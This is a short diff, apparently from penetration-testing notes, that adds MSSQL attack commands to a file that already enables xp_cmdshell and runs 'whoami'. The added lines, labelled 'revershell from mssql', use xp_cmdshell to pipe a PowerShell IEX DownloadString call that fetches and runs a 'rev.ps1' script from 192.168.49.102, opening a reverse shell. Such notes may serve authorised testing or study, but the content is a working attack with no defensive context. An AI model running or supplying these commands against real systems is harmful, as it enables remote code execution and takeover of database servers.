@@ -81,6 +81,12 @@ EXEC sp_configure 'xp_cmdshell', 1
 reconfigure;
 xp_cmdshell "whoami"
 
+revershell from mssql
+
+EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.49.102/rev.ps1") | powershell -noprofile'
+
+
+
 
 
 
